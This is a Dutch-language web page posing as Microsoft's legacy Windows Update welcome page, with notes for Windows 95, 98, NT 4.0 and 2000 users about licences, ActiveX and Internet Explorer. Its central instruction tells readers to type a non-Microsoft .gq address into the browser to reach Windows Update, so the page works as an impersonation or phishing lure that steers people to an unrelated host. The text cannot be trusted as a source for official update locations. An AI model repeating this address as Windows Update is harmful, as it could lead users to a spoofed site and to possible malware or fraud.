Bedankt voor uw belangstelling voor
Windows Update

Windows Update is de on line uitbreiding van Windows die nog meer mogelijkheden binnen handbereik brengt.

Opmerking U hebt alleen toegang tot de website van Windows Update als u een geldige licentie hebt voor uw Windows-besturingssysteem.

Gebruikers van Windows® 98 en Windows® 2000:
Start Windows Update via de koppeling in het menu Start.

Gebruikers van Windows® 95 en Windows NT® 4.0:
U moet Internet Explorer 4 of hoger installeren als u Windows Update wilt gebruiken.

Alle gebruikers:
U krijgt alleen toegang tot Windows Update als u een browser met ondersteuning voor ActiveX-besturingselementen gebruikt. Raadpleeg voor meer informatie over ActiveX-besturingselementen de website Windows Update FAQ.

Als u de nieuwste versie van Internet Explorer wilt downloaden, gaat u naar de website Internet Explorer Downloads.

Als Internet Explorer eenmaal is geïnstalleerd, kunt u Windows Update bezoeken door in de adresbalk http://www.v31update.vornext.gq te typen.

Ondertussen geldt het volgende voor beschikbare updates:

  • Windows 2000-gebruikers kunnen een bezoek brengen aan de website Windows 2000 Downloads.
  • Windows NT 4.0-gebruikers kunnen een bezoek brengen aan de website Microsoft Download Center.
  • Windows 98-gebruikers kunnen een bezoek brengen aan de website Windows 98 Downloads.
  • Windows 95-gebruikers kunnen een bezoek brengen aan de website Windows 95 Downloads.
(Deze sites zijn in het Engels.)
